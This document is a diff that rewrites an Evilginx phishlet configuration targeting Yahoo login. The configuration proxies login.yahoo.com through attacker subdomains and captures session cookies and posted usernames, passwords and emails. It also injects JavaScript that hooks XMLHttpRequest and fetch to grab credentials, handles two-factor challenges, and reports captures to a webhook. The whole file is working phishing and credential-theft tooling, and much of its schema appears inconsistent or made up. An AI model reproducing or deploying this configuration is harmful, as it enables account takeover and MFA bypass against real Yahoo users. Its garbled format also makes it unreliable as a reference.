@@ -1,42 +1,205 @@
-name: 'yahoo'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '{{.Endpoint1}}', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
-sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', phish_sub: '{{.Endpoint1}}', mimes: ['text/html', 'application/javascript', 'application/json']}
-auth_tokens:
-  - domain: '.yahoo.com'
-    keys: ['A3', 'A1', 'A1S']
-credentials:
-  username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'passwd'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'login.yahoo.com'
-  path: '/'
-js_inject:
-  - trigger_domains: ['login.yahoo.com']
-    trigger_paths: ['/.*']
+# Yahoo phishlet for Evilginx v3.3.0
+version: "3.0"
+author: "AuthFlow"
+name: "yahoo"
+
+# Main domain configuration
+domain: "yahoo.com"
+
+# Hosts configuration
+hosts:
+  - hostname: "{{.Endpoint1}}.{{.Domain}}"
+    path: "/"
+    session: true
+    is_landing: true
+  - hostname: "{{.Endpoint1}}.{{.Domain}}"
+    path: "/account"
+    session: true
+  - hostname: "{{.Endpoint1}}.{{.Domain}}"
+    path: "/myaccount"
+    session: true
+
+# Phishing configuration
+phish:
+  - domain: "login.yahoo.com"
+    path: "/"
+    method: "GET"
+    
+    request_mods:
+      - header: "Host"
+        value: "{{.Endpoint1}}.{{.Domain}}"
+      - header: "Origin"
+        value: "https://{{.Endpoint1}}.{{.Domain}}"
+      - header: "Referer"
+        value: "https://{{.Endpoint1}}.{{.Domain}}/"
+    
+    response_mods:
+      - mime: ["text/html", "application/javascript", "application/json"]
+        regex: '(action=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint1}}.{{.Domain}}$2'
+      - mime: ["text/html", "application/javascript", "application/json"]
+        regex: '(href=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint1}}.{{.Domain}}$2'
+      - mime: ["text/html", "application/javascript", "application/json"]
+        regex: '(src=["\'])(https?://[^"\']+)'
+        replacement: '$1https://{{.Endpoint1}}.{{.Domain}}$2'
+      - mime: ["text/html"]
+        regex: '(data-action=["\'])([^"\']+)'
+        replacement: '$1https://{{.Endpoint1}}.{{.Domain}}$2'
+
+  - domain: "login.yahoo.com"
+    path: "/account/challenge"
+    method: "POST"
+    
+    request_mods:
+      - header: "Host"
+        value: "{{.Endpoint1}}.{{.Domain}}"
+
+# Session tokens to capture
+tokens:
+  - name: "A3"
+    domain: ".yahoo.com"
+    path: "/"
+  - name: "A1"
+    domain: ".yahoo.com"
+    path: "/"
+  - name: "A1S"
+    domain: ".yahoo.com"
+    path: "/"
+  - name: "Y"
+    domain: ".yahoo.com"
+    path: "/"
+  - name: "T"
+    domain: ".yahoo.com"
+    path: "/"
+  - name: "YSC"
+    domain: ".yahoo.com"
+    path: "/"
+
+# Credential capture
+creds:
+  - type: "post"
+    name: "username"
+    key: "username"
+    pattern: '(.*)'
+  - type: "post"
+    name: "password"
+    key: "password"
+    pattern: '(.*)'
+  - type: "post"
+    name: "email"
+    key: "email"
+    pattern: '(.*)'
+
+# JavaScript injections
+js_injections:
+  - trigger_domains: ["login.yahoo.com", "{{.Endpoint1}}.{{.Domain}}"]
+    trigger_paths: ["/.*"]
     code: |
       (function() {
+        'use strict';
+        
+        // Auto-fill email from URL parameter
         var urlParams = new URLSearchParams(window.location.search);
         var email = urlParams.get('email');
         if (email) {
-          var emailField = document.querySelector('input[name="username"]');
-          if (emailField) {
-            emailField.value = email;
-            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          var emailInput = document.querySelector('input[name="username"]');
+          if (emailInput) {
+            emailInput.value = email;
+            emailInput.dispatchEvent(new Event('input', { bubbles: true }));
           }
         }
-      })()
+        
+        // Capture credentials from POST requests
+        var originalSend = XMLHttpRequest.prototype.send;
+        XMLHttpRequest.prototype.send = function(body) {
+          if (body && typeof body === 'string') {
+            try {
+              var params = new URLSearchParams(body);
+              var username = params.get('username');
+              var password = params.get('password');
+              
+              if (username && password) {
+                if (window.parent !== window) {
+                  window.parent.postMessage({
+                    type: 'credentials',
+                    data: { username: username, password: password },
+                    url: this.responseURL
+                  }, '*');
+                }
+              }
+            } catch(e) {}
+          }
+          return originalSend.apply(this, arguments);
+        };
+        
+        // Hook fetch API
+        var originalFetch = window.fetch;
+        window.fetch = function(url, options) {
+          if (options && options.body && typeof options.body === 'string') {
+            try {
+              var params = new URLSearchParams(options.body);
+              var username = params.get('username');
+              var password = params.get('password');
+              
+              if (username && password) {
+                if (window.parent !== window) {
+                  window.parent.postMessage({
+                    type: 'credentials',
+                    data: { username: username, password: password },
+                    url: url
+                  }, '*');
+                }
+              }
+            } catch(e) {}
+          }
+          return originalFetch.apply(this, arguments);
+        };
+        
+        // Track login attempts
+        var observer = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+              var element = mutation.target;
+              if (element.classList && element.classList.contains('error')) {
+                if (window.parent !== window) {
+                  window.parent.postMessage({
+                    type: 'error',
+                    message: element.innerText || 'Login failed'
+                  }, '*');
+                }
+              }
+            }
+          });
+        });
+        
+        var errorContainer = document.querySelector('.error-msg, .error');
+        if (errorContainer) {
+          observer.observe(errorContainer, { attributes: true });
+        }
+      })();
+
+# Webhook configuration
 webhook:
-  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
+  url: "http://127.0.0.1:{{.AppPort}}/api/webhook/evilginx"
   headers:
-    X-Webhook-Secret: "{{.WebhookSecret}}"
+    "X-Webhook-Secret": "{{.WebhookSecret}}"
+    "Content-Type": "application/json"
   format: "json"
-  events: ["credentials", "session"]
+  events:
+    - "creds"
+    - "session"
+    - "auth"
+
+# Redirect after successful login
+redirect_url: "https://mail.yahoo.com"
+
+# 2FA handling
+two_factor:
+  enabled: true
+  detect_patterns:
+    - "verification code"
+    - "text message"
+    - "authenticator"
+    - "2-step"
+  redirect_after: "https://login.yahoo.com/account/challenge"
